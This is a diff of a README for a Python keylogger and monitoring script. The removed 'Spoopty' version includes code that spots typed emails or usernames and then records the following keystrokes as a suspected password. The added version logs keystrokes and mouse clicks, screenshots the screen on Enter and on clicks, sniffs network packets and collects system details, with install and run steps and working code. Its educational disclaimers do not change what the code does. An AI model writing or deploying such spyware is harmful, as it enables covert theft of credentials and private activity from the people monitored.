@@ -1,165 +1,221 @@
-# Spoopty Keylogger and System Scraper
+# Keylogger and Network Monitoring Script
 
-## Description
+This Python script provides a comprehensive solution for keylogging, mouse click monitoring, network packet capture, and system information gathering. It is designed to run on macOS, Windows, and Linux operating systems.
 
-Spoopty is a keylogger and system monitor that logs keyboard inputs, mouse movements, mouse clicks, and mouse scrolls along with the corresponding window information, process names, and URLs. It also captures screenshots when specific events occur, such as pressing the Enter key or clicking the left mouse button. The script is designed to work on Windows, macOS, and Linux operating systems.
+## Features
 
-## Variable Definitions
+- Keylogging: Captures keyboard input and logs the pressed keys along with the associated window information.
+- Mouse Click Monitoring: Logs mouse clicks with the corresponding coordinates, button, and window information.
+- Screenshot Capture: Takes screenshots whenever the Enter key is pressed or a mouse click occurs, saving them with a timestamp and the associated window title and process name.
+- Network Packet Capture: Captures network packets using the Scapy library and saves them to a PCAP file.
+- System Information Gathering: Collects various system information such as operating system details, CPU information, memory usage, network interfaces, and mounted drives.
+- Logging: Logs all the captured events and system information to a log file with timestamps.
+- Cross-Platform Support: Supports macOS, Windows, and Linux operating systems.
 
-- `os_name`: The name of the operating system (e.g., Windows, Darwin, Linux).
-- `current_datetime`: The current date and time formatted as "YYYY-MM-DD_HH-MM-SS".
-- `log_file`: The path to the log file where the captured information will be stored.
-- `active_window`: The currently active window information.
-- `active_url`: The URL of the currently active window.
-- `suspected_password`: The suspected password captured during the password entry process.
-- `password_entry_started`: A flag indicating whether the password entry process has started.
+## Requirements
+
+- Python 3.x
+- Required Python libraries: `mss`, `pynput`, `scapy`, `psutil`
+- Operating System specific libraries:
+  - macOS: `pyobjc`
+  - Windows: `pywin32`
+  - Linux: `python-xlib`
 
 ## Installation
 
 1. Clone the repository or download the script file.
-2. Install the required dependencies by running the following command:
+
+2. Install the required Python libraries by running the following command:
+
    ```
    pip install -r requirements.txt
    ```
 
-## Architecture Overview
+   If you don't have a `requirements.txt` file, you can manually install the libraries using the following command:
 
-The script consists of the following main components:
-
-1. **Logging Configuration**: The script configures the logging system to store the captured information in a log file named `Logs/{os_name}_{current_datetime}.log`.
-
-2. **Machine Information**: The script retrieves various machine information such as operating system details, network type, user account, drive mappings, and more. This information is logged at the start of the script.
-
-3. **Webpage Source Retrieval**: The script provides functions to retrieve the source code of a webpage using either the `requests` library or platform-specific methods.
-
-4. **Input Name Extraction**: The script analyzes the webpage source to extract the names of input fields and buttons based on the cursor position.
-
-5. **Screenshot Capture**: The script captures screenshots of each monitor when specific events occur, such as pressing the Enter key or clicking the left mouse button. The screenshots are saved in the "Screen Captures" directory.
-
-6. **Social Media URL Detection**: The script checks if a URL belongs to a social media platform based on a predefined list of social media URLs.
-
-7. **Keyboard and Mouse Monitoring**: The script uses the `pynput` library to monitor keyboard and mouse events. It logs the captured information along with the corresponding window information, process names, and URLs.
-
-## Usage Examples
-
-1. Run the script using the following command:
    ```
-   python spoopty.py
+   pip install mss pynput scapy psutil pyobjc pywin32 python-xlib
    ```
 
-2. The script will start monitoring keyboard and mouse events and capturing relevant information.
+   Note: The `pyobjc` library is only required for macOS, `pywin32` for Windows, and `python-xlib` for Linux.
 
-3. The captured information will be logged in the `Logs/{os_name}_{current_datetime}.log` file.
+3. Run the script using the following command:
 
-4. Screenshots will be captured when specific events occur and saved in the "Screen Captures" directory.
-
-5. To stop the script, press `Ctrl+C` in the terminal or command prompt.
-
-## Function Descriptions
-
-- `get_machine_info()`: Retrieves various machine information such as operating system details, network type, user account, drive mappings, and more.
-- `log_machine_info()`: Logs the machine information at the start of the script.
-- `get_webpage_source(url)`: Retrieves the source code of a webpage using either the `requests` library or platform-specific methods.
-- `get_input_name(url, x, y)`: Analyzes the webpage source to extract the name of an input field or button based on the cursor position.
-- `get_window_info()`: Retrieves information about the currently active window (not available on all operating systems).
-- `take_screenshot(process_name)`: Captures screenshots of each monitor and saves them in the "Screen Captures" directory.
-- `is_social_media_url(url)`: Checks if a URL belongs to a social media platform based on a predefined list of social media URLs.
-- `extract_social_media_info(text)`: Extracts email addresses and social media usernames from the provided text using regular expressions.
-- `on_press(key)`: Callback function triggered when a key is pressed.
-- `on_release(key)`: Callback function triggered when a key is released.
-- `on_move(x, y)`: Callback function triggered when the mouse is moved.
-- `on_click(x, y, button, pressed)`: Callback function triggered when a mouse button is clicked.
-- `on_scroll(x, y, dx, dy)`: Callback function triggered when the mouse is scrolled.
-
-## Legal and Ethical Disclaimer
-
-This script is provided for educational and informational purposes only. The use of keyloggers and monitoring tools may be subject to legal restrictions and ethical considerations. It is the responsibility of the user to ensure compliance with all applicable laws and regulations and to obtain proper authorization before using this script.
-
-The authors and contributors of this script are not liable for any misuse, damage, or legal consequences arising from the use of this script. By using this script, you acknowledge and agree that you are solely responsible for your actions and any consequences that may result from using this script.
-
-Please use this script responsibly and respect the privacy and rights of others.
-
-## Code Snippets
-
-Here are a few relevant code snippets from the script:
-
-1. Logging configuration:
-   ```python
-   log_file = f'Logs/{os_name}_{current_datetime}.log'
-   logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
+   ```
+   python keylogger.py
    ```
 
-2. Retrieving machine information:
-   ```python
-   def get_machine_info():
-       info = []
-       info.append(f"Operating System: {platform.system()} {platform.release()}")
+   Make sure to replace `keylogger.py` with the actual name of the script file if it's different.
 
-       if psutil:
-           info.append(f"Network Type: {psutil.net_if_stats()}")
-           info.append(f"User Account: {psutil.users()[0].name}")
-           info.append(f"User Access Level: {psutil.Process().username()}")
-           info.append(f"Drive Mappings: {psutil.disk_partitions()}")
-           info.append(f"Drive Names: {[i.mountpoint for i in psutil.disk_partitions()]}")
+## Configuration
 
-       info.append(f"Domain: {socket.getfqdn()}")
-       info.append(f"IPv4: {socket.gethostbyname(socket.gethostname())}")
-       info.append(f"MAC Address: {':'.join(c + d for c, d in zip(*[iter(hex(uuid.getnode())[2:].zfill(12))]*2))}")
+The script does not require any additional configuration. It automatically creates the necessary directories (`Logs`, `Screen Captures`, and `Packets`) in the same location as the script file.
 
-       return '\n'.join(info)
-   ```
+## Usage
 
-3. Capturing screenshots:
-   ```python
-   def take_screenshot(process_name):
-       timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-       screenshot_dir = "Screen Captures"
-       os.makedirs(screenshot_dir, exist_ok=True)
+Once the script is running, it will start capturing keystrokes, mouse clicks, and network packets. The captured data will be logged to the respective log files in the `Logs` directory. Screenshots will be saved in the `Screen Captures` directory, and network packets will be saved as PCAP files in the `Packets` directory.
 
+To stop the script, press `Ctrl+C` in the terminal where the script is running.
+
+## Code Explanation
+
+Here are some key components of the code:
+
+### Gathering System Information
+
+The `gather_system_info()` function collects various system information using the `platform`, `psutil`, and `socket` modules. It retrieves details such as the operating system, CPU information, memory usage, network interfaces, and mounted drives. The gathered information is then logged to the log file.
+
+```python
+def gather_system_info():
+    info = ["System Information:"]
+    info.append(f"Operating System: {platform.system()} {platform.release()} {platform.version()}")
+    info.append(f"Architecture: {platform.machine()}")
+    info.append(f"Processor: {platform.processor()}")
+    info.append(f"CPU Frequency: {psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A'} MHz")
+    info.append(f"Physical cores: {psutil.cpu_count(logical=False)}")
+    info.append(f"Total cores: {psutil.cpu_count(logical=True)}")
+    info.append(f"RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB")
+    info.append(f"Login Name: {os.getlogin()}")
+
+    warned_interfaces = set()
+    for interface, addrs in psutil.net_if_addrs().items():
+        has_ipv4 = False
+        for addr in addrs:
+            if addr.family == socket.AF_INET:
+                info.append(f"IP Address ({interface}): {addr.address}")
+                has_ipv4 = True
+                break
+            elif addr.family == psutil.AF_LINK:
+                info.append(f"MAC Address ({interface}): {addr.address}")
+        if not has_ipv4 and interface not in warned_interfaces:
+            info.append(f"WARNING: No IPv4 address found on {interface} !")
+            warned_interfaces.add(interface)
+
+    for partition in psutil.disk_partitions():
+        info.append(f"Mounted drive: {partition.device} mounted on {partition.mountpoint} with fstype {partition.fstype}")
+
+    return '\n'.join(info)
+```
+
+### Keylogging and Mouse Click Monitoring
+
+The script uses the `pynput` library to monitor keyboard and mouse events. The `on_press()`, `on_release()`, and `on_click()` functions are callback functions that are triggered when the corresponding events occur. These functions log the captured events along with the associated window information.
+
+```python
+def on_click(x, y, button, pressed):
+    if pressed:
+        action = f"Mouse clicked at ({x}, {y}) with button {button}"
+        log_interaction(f"[Mouse Click] {action}")
+        take_screenshot(action)
+
+def on_press(key):
+    try:
+        action = f"Key pressed: {key}"
+        log_interaction(f"[Keyboard Input] {action}")
+        if key == keyboard.Key.enter:
+            take_screenshot(action)
+
+        # Check for related packet captures with exact line numbers
+        related_packets = []
+        pcap_file = f'Packets/{os_name}_{current_datetime}.pcap'
+        if os.path.exists(pcap_file):
+            packets = rdpcap(pcap_file)
+            for i, pkt in enumerate(packets):
+                if pkt.haslayer(TCP) and pkt[TCP].payload:
+                    payload = pkt[TCP].payload.load.decode('utf-8', 'ignore')
+                    if str(key) in payload:
+                        related_packets.append((i + 1, payload))  # Store line number and payload
+
+        if related_packets:
+            interaction_details = ", ".join(f"Line {line}: {data}" for line, data in related_packets)
+            log_interaction(f"[Keyboard Input] {action} - Related Packets: {interaction_details}")
+
+    except Exception as e:
+        logging.error(f"Error processing key press: {str(e)}")
+
+def on_release(key):
+    action = f"Key released: {key}"
+    log_interaction(f"[Keyboard Release] {action}")
+```
+
+### Screenshot Capture
+
+The `take_screenshot()` function is responsible for capturing screenshots whenever the Enter key is pressed or a mouse click occurs. It uses the `mss` library to capture the screenshot and saves it with a timestamp, the associated window title, and the process name.
+
+```python
+def take_screenshot(action):
+    directory = "Screen Captures"
+    os.makedirs(directory, exist_ok=True)  # Ensure the directory exists
     with mss.mss() as sct:
-        for i, monitor in enumerate(sct.monitors[1:], start=1):
-            screenshot_name = f"{screenshot_dir}/{timestamp}_{process_name}_monitor{i}.png"
-            sct.shot(mon=i, output=screenshot_name)
-   ```
+        window_info = get_window_info()
+        if ' - ' in window_info:
+            window_title, process_name = window_info.split(' - ', 1)  # Split safely with maxsplit
+        else:
+            window_title = 'unknown'
+            process_name = psutil.Process().name()
 
-4. Keyboard and mouse monitoring:
-   ```python
-   def on_press(key):
-       global active_window, active_url, suspected_password, password_entry_started
-       
-       window_info = get_window_info()
-       process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
-       log_entry = f'Key pressed: {key} - Process: {process_name} - Window Info: {window_info}'
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        sanitized_title = sanitize_filename(window_title)
+        sanitized_process = sanitize_filename(process_name)
+        filename = f"{directory}/{timestamp}_{sanitized_title}_{sanitized_process}.png"
 
-       if isinstance(key, keyboard.KeyCode):
-           emails, usernames = extract_social_media_info(key.char)
-           if emails:
-               log_entry += f' - Social Media Email(s): {", ".join(emails)}'
-               active_window = window_info
-               active_url = window_info.split(' - URL:')[-1].strip() if ' - URL:' in window_info else ''
-               password_entry_started = True
-               suspected_password = ''
-           if usernames:
-               log_entry += f' - Social Media Username(s): {", ".join(usernames)}'
-               active_window = window_info
-               active_url = window_info.split(' - URL:')[-1].strip() if ' - URL:' in window_info else ''
-               password_entry_started = True
-               suspected_password = ''
-           
-           if password_entry_started:
-               if key == keyboard.Key.enter:
-                   log_entry += f' - Suspected Password: [{suspected_password}]'
-                   password_entry_started = False
-               elif key == keyboard.Key.backspace:
-                   suspected_password = suspected_password[:-1]
-               else:
-                   suspected_password += key.char
-       
-       log_entry = f'[Keyboard Input] {log_entry}'
-       logging.info(log_entry)
+        try:
+            sct.shot(output=filename)
+            log_interaction(f"Screenshot captured: {filename}")
+        except Exception as e:
+            logging.error(f"Failed to capture screenshot: {str(e)}")
+```
 
-       if key == keyboard.Key.enter:
-           take_screenshot(process_name)
-   ```
+### Network Packet Capture
 
-Please refer to the script file for the complete code and implementation details.
+The script uses the Scapy library to capture network packets. The `packet_capture_worker()` function is run in a separate process to continuously capture packets until the stop event is set. The captured packets are saved to a PCAP file.
+
+```python
+def packet_capture_worker(stop_event, filename):
+    packets = []
+    def handle_packet(packet):
+        packets.append(packet)
+    try:
+        sniff(prn=handle_packet, stop_filter=lambda x: stop_event.is_set())
+        wrpcap(filename, packets)
+    except Exception as e:
+        logging.error(f"Failed to capture packets: {str(e)}")
+
+def start_packet_capture(filename):
+    stop_event = multiprocessing.Event()
+    packet_process = multiprocessing.Process(target=packet_capture_worker, args=(stop_event, filename))
+    packet_process.start()
+    return stop_event, packet_process
+
+def stop_packet_capture(stop_event, packet_process):
+    stop_event.set()
+    packet_process.join()
+```
+
+### Logging
+
+The script uses the `logging` module to log all the captured events and system information to a log file. The log file is created with a timestamp and the operating system name in the `Logs` directory.
+
+```python
+def setup_logging():
+    logging.basicConfig(filename=log_file_path, level=logging.INFO, format='%(asctime)s - %(message)s')
+
+    with open(log_file_path, 'a') as log_file:
+        log_file.write("System Information:\n")
+        log_file.write(gather_system_info() + '\n')
+        log_file.write("------------------------\n")
+```
+
+## Legal Disclaimer
+
+This script is provided for educational and informational purposes only. The use of this script to monitor or capture data from systems or networks without proper authorization and consent is strictly prohibited and may violate applicable laws and regulations. The author and contributors of this script are not responsible for any misuse or illegal activities conducted using this script. It is the user's responsibility to ensure that they have the necessary permissions and comply with all applicable laws and ethical guidelines when using this script.
+
+## License
+
+This script is licensed under the GNU General Public License (GPL). You are free to use, modify, and distribute this script under the terms of the GPL. However, please note that the script is provided "as is" without any warranty or liability. The author and contributors of this script shall not be held responsible for any damages or consequences arising from the use of this script.
+
+For more information about the GPL, please refer to the [GNU General Public License](https://www.gnu.org/licenses/gpl-3.0.en.html).
+
+## Disclaimer
+
+This script is intended for educational and informational purposes only. The author and contributors of this script do not endorse or encourage any illegal or unethical activities. Use this script responsibly and in compliance with all applicable laws and regulations.
